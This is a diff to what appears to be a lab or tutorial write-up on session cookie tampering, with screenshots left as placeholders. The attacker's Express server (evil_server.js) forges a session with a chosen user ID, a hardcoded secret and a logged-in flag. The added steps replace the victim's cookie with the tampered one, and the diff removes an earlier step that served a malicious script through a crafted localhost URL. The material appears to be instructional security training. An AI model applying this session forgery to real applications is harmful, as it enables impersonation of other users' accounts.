@@ -77,7 +77,7 @@ app.use(
 );
 
 app.get("", (req, res) => {
-  req.session.userId = 2;
+  req.session.userId = 2; // CHANGED THE USER ID
   req.session.secret = "e5ac-4ebf-03e5-9e29-a3f562e10b22";
   req.session.loggedIn = true;
   res.render("evil.ejs");
@@ -112,11 +112,11 @@ $ node evil_server.js
 
 PRINTSCREEN PLACEHOLDER
 
-Now we can serve our malicious js file to the application
+Now we can replace our original cookie with the tampered cookie.
 
-```text
-http://localhost:5000/#xxxxhttp://localhost:1337
-```
+PRINTSCREEN PLACEHOLDER
+
+Refresh the page:
 
 PRINTSCREEN PLACEHOLDER
 
